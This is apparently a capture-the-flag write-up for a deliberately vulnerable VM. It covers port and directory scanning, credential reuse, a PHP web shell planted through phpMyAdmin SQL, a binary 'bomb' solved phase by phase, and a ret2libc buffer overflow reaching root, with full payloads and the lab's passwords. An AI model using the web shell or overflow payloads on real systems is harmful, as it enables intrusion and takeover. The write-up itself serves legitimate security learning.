# VM set-up

In order to do the challenge, we chose to work with VirtualBox VM. First of all, open VirtualBox and create a network adapter. <br/>
Then, download the VM's disk image from the intranet, create a new VM with the image, and finally connect it to the network under the "private host mode" (using the network adapter created beforehand, here it's `vboxnet0`).
You're set !

# Let's start digging

Of course the VM does not offer its IP address, so let's dig in.

First of all, let's run a simple `ifconfig`, in order to retrieve our `vboxnet0` (our network adapter) address. <br/>
On our network, it should go as follows : <br/>

`$ ifconfig`<br/>
`[...]`<br/>
`vboxnet0: [...]`<br/>
`inet X.X.99.1 netmask 0xffffff00 broadcast X.X.99.255` (X's for privacy only)

We can deduce that the VM's IP approximates this IP, for example : X.X.99.178.

Let's download nmap (here under MacOS) : `brew install nmap`<br/>
Using `nmap`, we'll scan for open ports under a wide range of IPs, like so : `nmap -v X.X.99.1-255` (`-v` for verbosity, `1-255` to scan a range of IPs).

Bingo, we just found a variety of open ports for the following IP addr : `X.X.99.107` (can vary on your machine)<br/>
`Nmap scan report for X.X.99.107`<br/>
`Host is up (0.0024s latency).`<br/>
`Not shown: 994 filtered ports`<br/>
`PORT    STATE SERVICE`<br/>
`21/tcp  open  ftp`<br/>
`22/tcp  open  ssh`<br/>
`80/tcp  open  http`<br/>
`143/tcp open  imap`<br/>
`443/tcp open  https`<br/>
`993/tcp open  imaps`<br/>

We can't access the VM via SSH for now, since we've got no username and password available.

We'll try to dig in the http/https ports, using another tool : `dirb`.<br/>
First, let's download dirb : `brew install sidaf/pentest/dirb`<br/>
`dirb` will help us know all the routes hosted on the http/https server, so we'll have more matter to gain access to the VM.

Head to dirb's installation folder (or create an alias), configure then make the installation (use `chmod 755` if needed).<br/>
Using the wordlists provided, we can investigate like so : `./dirb "https://[VM IP]" wordlists/common.txt` (or use `wordlists/big.txt`).

Bingo again, we find three interesting routes :<br/>
`/forum`<br/>
`/phpmyadmin`<br/>
`/webmail`</br>

# Forum

Let's head to the forum : `https://[VM IP]/forum`<br/>
There's a topic called `"Probleme login ?"` from user `lmezard`. Read it. It contains a log of authentication requests done on the server previously (+ ssh, cronjobs, etc).

Keep scrolling down, and you'll find :<br/>
`Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2`<br/>
`Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]`<br/>
`Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)`

Looks like a clear password, doesn't it ? And apparently, the user `lmezard` managed to log in soon after the authentication failure. Save these informations for later.

We can keep investigating on the forum : there is a Log in page and a Users page (which gives us the names of all forum users).<br/>
Try to log in using the credentials : `lmezard : !q\]Ej?*5K5cy*AJ`<br/>
It works ! On lmezard's account page, we find an e-mail address : `laurie@borntosec.net`

Good, let's find out if we can access the mail server with these informations.

# Webmail

Go to : `https://[VM IP]/webmail`<br/>
When asked, try the combo : `laurie@borntosec.net : !q\]Ej?*5K5cy*AJ`<br/>
Aaaand... it works. Laurie did not pick another password for the mail section, which is a security breach.

Laurie exchanged e-mails with `ft_root@mail.borntosec.net` (if you ding in the `INBOX.Sent` section), and got an answer from `qudevide@mail.borntosec.net` :<br/>
`You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$` (which translates to `root : Fg-'kKXBj87E:aJ$` credentials).

We can learn more on SquirrelMail while lurking around the `/webmail` section. Basically, SquirrelMail is a webmail service which includes built-in pure PHP support for the IMAP and SMTP protocols. It can be set-up on a web server that runs PHP (and an IMAP server).

More here : https://squirrelmail.org/docs/admin/admin-1.html#ss1.1

Here, we can deduce it basically provides a mailing service for all the users on the VM (lmezard, thor, zaz, root...).

Now that we have database credentials, let's dig into it !


# Phpmyadmin

Go to : `https://[VM IP]/phpmyadmin`<br/>
Log in using root credentials : `root : Fg-'kKXBj87E:aJ$`<br/>
We can find a database called `forum_db`. We can find all users passwords under the `mlf2_userdata` table, but it won't help much.

What we can try, though, is to hack into the DB using an SQL injection inside the `forum_db` database. Since it's probably a LAMP server (so with Apache, information we can find while inspecting the network pannel on the forum), we could get direct access to the VM through a shell instance.

After surfing on the web for a while, we learn we can inject shell commands inside the db using a PHP script, like so : `SELECT "<?php system($_GET['cmd']); ?>" into outfile "[FOLDER WHERE THE SERVER IS STORED]/hello.php";`<br/>
Why that works : `system()` PHP function is used to launch shell commands. Here, we'll tell PHP to run any command which is stored in the `hello.php?cmd=something` query, from the URL.

Under LAMP, files from the website are usually stored under `/var/www/` or `/var/www/custom_routes` (which is probably the case here, like `/var/www/forum`).
Simply using the command won't work, we need to find a folder on which we have rights to store the script.

Using `dirb` again, we can find many routes/folders under the `/forum` one. We can inject the script in the following folder : `/forum/templates_c/`<br/>
Correct the SQL injection : `SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/hello.php";`

Bingo ! Now we can launch commands from the URL via the `hello.php` script like so : `https://[VM IP]/forum/templates_c/hello.php?cmd=command`

Let's dig : `https://[VM IP]/forum/templates_c/hello.php?cmd=ls%20%20/home` (all space characters are converted using URL encoding conventions, here ` ` is equal to `%20`, etc).<br/>
We find : `LOOKATME ft_root laurie laurie@borntosec.net lmezard thor zaz`<br/>

Play around (LOOKATME is a folder), then look at the `password` inside the LOOKATME folder file using the `cat` command : `https://[VM IP]/forum/templates_c/hello.php?cmd=cat%20/home/LOOKATME/password`<br/>
We get a login:password couple : `lmezard:G!@M6f4Eatau{sF"`

We can use these credentials to log directly inside the VM.

Sources :<br/>
https://docs.joomla.org/Configuring_a_LAMPP_server_for_PHP_development/Linux_desktop<br/>
https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/<br/>
https://www.php.net/manual/en/function.system.php

# So much fun !

When logged as lmezard (using the previous login:password credentials), we have access to two files : `fun` and `README`.<br/>
The README says to complete the challenge in order to get ssh access as `laurie`.<br/>
The `fun` file is unreadable inside the VM, let's copy it inside our own environment using `ftp` (file transfer protocol). You can download it inside MacOS via homebrew : `brew install inetutils` (you now have access to the `ftp` command).

Download the `fun` file : `ftp [VM IP]` (then pursue as `lmezard`, use the password again), then inside the environment use `get fun` (exit using `bye`).

Read the `fun` file (using VScode, for example).
Keep scrolling and you'll find this section : <br/>
` int main() {`<br/>
`	printf("M");`<br/>
`	printf("Y");`<br/>
`	printf(" ");`<br/>
`	printf("P");`<br/>
`	printf("A");`<br/>
`	printf("S");`<br/>
`	printf("S");`<br/>
`	printf("W");`<br/>
`	printf("O");`<br/>
`	printf("R");`<br/>
`	printf("D");`<br/>
`	printf(" ");`<br/>
`	printf("I");`<br/>
`	printf("S");`<br/>
`	printf(":");`<br/>
`	printf(" ");`<br/>
`	printf("%c",getme1());`<br/>
`	printf("%c",getme2());`<br/>
`	printf("%c",getme3());`<br/>
`	printf("%c",getme4());`<br/>
`	printf("%c",getme5());`<br/>
`	printf("%c",getme6());`<br/>
`	printf("%c",getme7());`<br/>
`	printf("%c",getme8());`<br/>
`	printf("%c",getme9());`<br/>
`	printf("%c",getme10());`<br/>
`	printf("%c",getme11());`<br/>
`	printf("%c",getme12());`<br/>
`	printf("\n");`<br/>
`	printf("Now SHA-256 it and submit");`<br/>
`}`<br/>

So : `MY PASSWORD IS : [the result of all getme() functions] hashed with the SHA-256 algorithm`.<br/>
We only have direct access to the return values of functions `getme8-12()`, which results in `wnage`, we'll need to dig in order to find `getme1-7()`.<br/>
We choose to dig visually, using `CMD+F getme`. We can find all `getmeX()` functions but the return values are simple jokes.

Keep digging around : all `getme1-7()` functions bodies are prefixed with comments structured as `//fileXXX [data] ft_fun/file.pcap [data]`, all wrapped inside curly brackets (`{}`).
Still using `CMD+F getme`, there are always such comments wrapped inside the functions. Also, there are `return 'something'` strings inside the `fun` file.

After thinking and trying many approaches, we can deduce the logic is as follows : if the comment inside a `getmeX()` points to `//file10` for example, we need to look for `//file11`. After reading the content of the line associated with the file, we can almost always be certain there will be a `return 'something'` string upwards.<br/>
For example : `getme7()` points toward `file736`, so we look for `file737`, and at the end of the line, two lines upward, we find `return 'p'`.

To complete the challenge we need to work in descending order : look for `getme7()`, find the `return 'p'`, then look for `getme6()`, find the `return 't'`, and so on...<br/>
This won't work with `getme1()`, which is where we find the trick : if you look for all the returns using `CMD+F`, there is a lone `return 'I'` which falls outside this logic. Since it's a capital 'I', we can deduce it's the start of the password (and so, the return value associated with `getme1()` !).

So, working in descending order and taking in the lone `I` afterwards, we can recreate the password, which gives us : `Iheartpwnage`.<br/>
Sha-256 : `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`

Use the couple `laurie : 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4` to log in as laurie with SSH.<br/>
`ssh laurie@VM IP` (then enter the password when asked).

We're in !
<br />
<br />
# Dephusing the Bomb

## Phase1:
ghidra decompilation phase1:
```c
void phase_1(char *param_1)
{
  int iVar1;
  iVar1 = strings_not_equal(param_1,"Public speaking is very easy.");
  if (iVar1 != 0) {
    explode_bomb();
  }
  return;
}
```
—> Public speaking is very easy.

## Phase2:
ghidra decompilation phase2:
```c
void phase_2(char *param_1)
{
  int iVar1;
  int aiStack32 [7];
  read_six_numbers(param_1,(int)(aiStack32 + 1));
  if (aiStack32[1] != 1) {
    explode_bomb();
  }
  iVar1 = 1;
  do {
    if (aiStack32[iVar1 + 1] != (iVar1 + 1) * aiStack32[iVar1]) {
      explode_bomb();
    }
    iVar1 = iVar1 + 1;
  } while (iVar1 < 6);
  return;
}
```
we got: 
- stack[1] = 1
- stack[1 + 1] = (1 + 1) * 1
- stack[2] = 2
- stack[2 + 1] = (2 + 1) * 2
- stack[3] = 6
- stack[3 + 1] = (3 + 1) * 6
- stack[4] = 24
- stack[4 + 1] = (4 + 1) * 24
- stack[5] = 120
- stack[5 + 1] = (5 + 1) * 120
- stack[6] = 720
—> 1 2 6 24 120 720

## Phase3:
ghidra decompilation phase3:
```c
void phase_3(char *param_1)
{
  int iVar1;
  char cVar2;
  uint local_10;
  char local_9;
  int local_8;
  iVar1 = sscanf(param_1,"%d %c %d",&local_10,&local_9,&local_8);
  if (iVar1 < 3) {
    explode_bomb();
  }
  switch(local_10) {
  case 0:
    cVar2 = 'q';
    if (local_8 != 0x309) {
      explode_bomb();
    }
    break;
  case 1:
    cVar2 = 'b';
    if (local_8 != 0xd6) {
      explode_bomb();
    }
    break;
  case 2:
    cVar2 = 'b';
    if (local_8 != 0x2f3) {
      explode_bomb();
    }
    break;
  ………….
  default:
    cVar2 = 'x';
    explode_bomb();
  }
  if (cVar2 != local_9) {
    explode_bomb();
  }
  return;
}
```
The README indicate that the code contains "b" in the answer:
case 1 : 1 b 214 
—> 1 b 214

## Phase4:
ghidra decompilation phase4:
```c
void phase_4(char *param_1)
{
  int iVar1;
  int local_8;
  iVar1 = sscanf(param_1,"%d",&local_8);
  if ((iVar1 != 1) || (local_8 < 1)) {
    explode_bomb();
  }
  iVar1 = func4(local_8);
  if (iVar1 != 0x37) {
    explode_bomb();
  }
  return;
}
int func4(int param_1)
{
  int iVar1;
  int iVar2;
  if (param_1 < 2) {
    iVar2 = 1;
  }
  else {
    iVar1 = func4(param_1 + -1);
    iVar2 = func4(param_1 + -2);
    iVar2 = iVar2 + iVar1;
  }
  return iVar2;
}
```
This is recursive and not possible to do it mentally so we script it:
Test.c:
```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
int func4(int param_1)
{
  int iVar1;
  int iVar2;
  if (param_1 < 2) {
    iVar2 = 1;
  }
  else {
    iVar1 = func4(param_1 + -1);
    iVar2 = func4(param_1 + -2);
    iVar2 = iVar2 + iVar1;
  }
  return iVar2;
}
int main(int ac, char **av) {
  int param_1 = atoi(av[1]);
printf("%d", func4(param_1));
}
```
```sh
➜  work ./test 1
1% 
➜  work ./test 2
2%
 ➜  work ./test 3
3%
 ➜  work ./test 4
5%
 ➜  work ./test 5
8%
➜  work ./test 6
13%
➜  work ./test 7
21%
➜  work ./test 8
34%
➜  work ./test 9
55%
```
0x37 = 9 so the answer is 9

## Phase 5:

The program awaits for a string who will pass through a mask [`& 0xF`] in order to get an INT and get this int correspond with a table available in the binary so the initial string will be equal to "giants"</br>
The table:

```sh
array.123                                       XREF[1]:     phase_5:08048d52(*)  
        0804b220 69              ??         69h    i
        0804b221 73              ??         73h    s
        0804b222 72              ??         72h    r
        0804b223 76              ??         76h    v
        0804b224 65              ??         65h    e
        0804b225 61              ??         61h    a
        0804b226 77              ??         77h    w
        0804b227 68              ??         68h    h
        0804b228 6f              ??         6Fh    o
        0804b229 62              ??         62h    b
        0804b22a 70              ??         70h    p
        0804b22b 6e              ??         6Eh    n
        0804b22c 75              ??         75h    u
        0804b22d 74              ??         74h    t
        0804b22e 66              ??         66h    f
        0804b22f 67              ??         67h    g
```
Each char with the mask should give us the index of each letter in "giatns" so :
- 0xYF & 0xF = 15 --> index[15] = g
- 0xY0 & 0xF = 0 --> index[0] = i
- 0xY5 & 0xF = 5 --> index[5] = a
- 0xYB & 0xF = 11 --> index[11] = n
- 0xYD & 0xF = 13 --> index[13] = t
- 0xY1 & 0xF = 1 --> index[1] = s

You can replace "Y" by the number you find corresponding in the ascii table:

- 6f -> o
- 70 -> p
- 65 -> e
- 6b -> k
- 6d -> m
- 71 -> q

-----> opekmq is the answer

## Phase 6

The program awaits for combination of 6 numbers.
I used gdb to display node1, node2, node3... 

(gdb) print node1
$1 = 253
(gdb) print node2
$2 = 725
(gdb) print node3
$3 = 301
(gdb) print node4
$4 = 997
(gdb) print node5
$5 = 212
(gdb) print node6
$6 = 432

we can see some value for this var. We know 4 is the first int (README) and it's value is the biggest so i tried to sort numbers by the biggest to the lower. And it's worked. so the combination is 4 2 6 3 1 5. 

# THOR

We can find a file `turle` with some instructions in it like "turn 1 degree left and go forward for 50 spaces .......". <br />
By drawing it we can find the word SLASH;
<img src="./screen.png">
The file ends with a clue: `Can you digest this message ?`<br />
We know that MD5 stands for message digest --> 
`646da671ca01bb5d84dbb5fb2238dc8e`

# ZAZ

# Exploit the binary

A basic exploit of strcpy without security on the parameter.

## Explication of the exploit

Using ghidra, we can retrieve the main: 
```c
uint main(int param_1,int param_2)

{
  char local_90 [140];
  
  if (1 < param_1) {
    strcpy(local_90,*(char **)(param_2 + 4));
    puts(local_90);
  }
  return (uint)(param_1 < 2);
}
```

We can see that the buffer is set to 140 and the program is strcpying the param into local90 withtout any limit. So when you write more than 140 chars, it will segfault because you will be trying to rewrite the EIP (the return adress).

### What are we gonna do about it ?

#### Getting system, exit and "/bin/sh adress"

We actually want to rewrite EIP with the adress of [system] so we can execute [/bin/sh].
To do it properly, we need to launch gdb set a breakpoint in main and start the prohgram to initialize the stack and get the adress.
```sh
gdb exploit_me
b main
r
p system --> $1 = {<text variable, no debug info>} 0xb7e6b060 <system>
p exit --> $2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
```
Next, we will need to find an adress that contains the string "/bin/sh", and to be sure there is one, we're gonna create it by exporting as an environment variable.

```sh
export SHELLSH=/bin/sh
```
And then we are gonna create a c script that's gonna give us the approximativ adress:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main(int argc, char **argv)
{
        char *ptr = getenv("SHELLSH");
        if (ptr != NULL)
        {
                printf("Estimated address: %p\n", ptr);
                return 0;
        }
}
```

```sh
zaz@BornToSecHackMe:~$ ./env_addr
Estimated address: 0xbfffffba
```

#### Using those adresses

So we know about the buffer 140, and the adresses so we are gonna create our own shellcode.
+ First step: we're gonne fill the buffer with random char: 'A' * 140
+ Second step: we're gonna rewrite the eip of strcpy by the adress of system:
'\xb7\xe6\xb0\x60'[::-1]
+ Third step we give to system a way to exit properly with the exit adress:
'\xb7\xe5\xeb\xe0'[::-1]
+ Last step is to give "/bin/sh" as argument to system to open the shell:
'\xbf\xff\xff\xba'[::-1]

Let's try it out !
```sh
./exploit_me `python -c "print('A' * 140 + '\xb7\xe6\xb0\x60'[::-1] + '\xb7\xe5\xeb\xe0'[::-1]) + '\xbf\xff\xff\xba'[::-1]"`
```
Because the adress of "/bin/sh" was approximative, we get the result 
```sh
"sh: 1: /sh: not found"
```
So we can play with this adress to find the exact beginning of the string:
```sh
'\xbf\xff\xff\xba'[::-1] --> '\xbf\xff\xff\xb9'[::-1] --> sh: 1: n/sh: not found
'\xbf\xff\xff\xb9'[::-1] --> '\xbf\xff\xff\xb8'[::-1] --> sh: 1: in/sh: not found
'\xbf\xff\xff\xb8'[::-1] --> '\xbf\xff\xff\xb7'[::-1] --> sh: 1: bin/sh: not found
'\xbf\xff\xff\xb7'[::-1] --> '\xbf\xff\xff\xb6'[::-1] --> 
# ls /
bin   cdrom  etc   initrd.img  media  opt   rofs  run	selinux  sys  usr  vmlinuz
boot  dev    home  lib	       mnt    proc  root  sbin	srv	 tmp  var
# whoami
root
#
```
Well done you are root !